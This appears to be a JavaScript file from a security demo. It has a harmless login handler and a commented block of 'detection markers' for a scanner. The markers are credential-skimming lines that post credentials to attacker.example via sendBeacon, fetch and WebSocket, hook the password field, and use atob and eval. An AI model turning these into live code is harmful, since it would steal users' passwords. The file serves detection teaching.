// DualLink demo app logic — BENIGN.
//
// The form handler below only shows a local message. It never reads the
// password value, stores it, or sends anything over the network.
document.getElementById('login').addEventListener('submit', function (e) {
  e.preventDefault();
  document.getElementById('status').textContent = 'Signed in (demo — nothing was sent).';
});

// -----------------------------------------------------------------------------
// DETECTION MARKERS (inert).
//
// The strings below are NOT executed. They live in a comment so the scanner in
// ../scan.sh has something to catch during the demo. In a real backdoor these
// would be live code; here they are text, so you can see what the scanner flags
// and compare it against indicators.md. Nothing here hooks a field or sends data.
//
//   marker: navigator.sendBeacon("https://attacker.example/collect", data)
//   marker: fetch("https://attacker.example/c", {method:"POST", body: creds})
//   marker: new WebSocket("wss://attacker.example/ws")
//   marker: document.querySelector('input[type=password]').addEventListener('input', ...)
//   marker: atob("ZXZpbA==")  // base64-decoded dynamic code
//   marker: eval(window.__x)   // dynamic execution of attacker-controlled string
// -----------------------------------------------------------------------------
